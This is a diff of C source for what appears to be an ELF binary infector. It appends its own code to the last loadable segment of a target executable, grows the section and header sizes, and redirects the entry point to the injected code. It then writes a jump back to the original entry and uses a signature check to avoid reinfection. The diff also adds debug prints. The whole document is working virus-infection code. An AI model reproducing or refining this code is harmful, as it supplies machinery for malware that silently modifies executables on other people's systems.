@@ -5,7 +5,7 @@
 void zeEnd();
 
 void setHeaders(struct sheaders64 *sHdrs, struct pheaders64 *pHdrs, struct ELFheaders64 *fHdr, int last_load_seg, int last_load_sec) {
-    fHdr->e_entry = pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz;
+    fHdr->e_entry = pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz + 0x42;
     fHdr->e_shoff += CODE_SZ + (pHdrs[last_load_seg].p_memsz - pHdrs[last_load_seg].p_filesz);
 
     sHdrs[last_load_sec].sh_size += CODE_SZ;
@@ -42,11 +42,11 @@ void    change_program_header(int fd, struct sheaders64 *sHdrs, struct pheaders6
     ft_syscall((void *)fd, (void *)sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0, WRITE);
 }
 
-void addJump(int fd, long unsigned int offset) {
+void addJump(int fd, unsigned long position, long unsigned int offset) {
     unsigned char jmp_code[] = {0xE9};
 
     offset -= 4;
-    ft_syscall((void *)fd, (void *)0x74, 0, 0, LSEEK);
+    ft_syscall((void *)fd, (void *)(position + 0x74), 0, 0, LSEEK);
     ft_syscall((void *)fd, (void *)jmp_code, (void *)sizeof(jmp_code), 0, WRITE);
     ft_syscall((void *)fd, (void *)&offset, (void *)4, 0, WRITE);
 }
@@ -57,7 +57,7 @@ void insertCode(int fd, struct pheaders64 *pHdrs, struct ELFheaders64 *fHdr, int
 
     ft_syscall((void *)fd, (void *)(pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_memsz), 0, 0, LSEEK);
     ft_syscall((void *)fd, (void *)&_start, (void *)len, 0, WRITE);
-    addJump(fd, fHdr->e_entry - (pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz + len));
+    addJump(fd, pHdrs[last_load_seg].p_offset + pHdrs[last_load_seg].p_memsz, fHdr->e_entry - (pHdrs[last_load_seg].p_paddr + pHdrs[last_load_seg].p_memsz + len));
 }
 
 unsigned long int    writeFile(int fd, struct ELFheaders64 fHdr) {
@@ -78,8 +78,11 @@ unsigned long int    writeFile(int fd, struct ELFheaders64 fHdr) {
     int last_load_seg;
     int last_load_sec;
 
+    ft_syscall((void *)1, (void *)"\nthis is a test\n", (void *)17, 0, WRITE);
+
     if (checkSignature(fd, signature) == 1)
         return (1);
+    ft_syscall((void *)1, (void *)"this is a test3\n", (void *)16, 0, WRITE);
     
     ft_syscall((void *)fd, (void *)fHdr.e_shoff, 0, 0, LSEEK);
     ft_syscall((void *)fd, (void *)sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0, READ);
